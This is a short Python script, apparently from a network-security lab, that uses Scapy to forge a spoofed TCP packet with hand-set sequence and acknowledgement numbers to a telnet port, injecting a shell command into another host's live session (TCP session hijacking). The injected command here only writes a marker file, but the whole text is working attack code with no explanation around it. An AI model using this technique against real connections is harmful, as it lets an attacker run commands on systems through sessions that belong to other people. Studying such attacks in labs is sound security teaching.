from scapy.all import ls, send, IP, TCP
ip = IP(src="19.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=58790, dport=23, flags="A", seq=2900657791, ack=2126266807)
data = "echo TCP_HIJACK_OK > /tmp/tcp_hijack_ok\r\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)

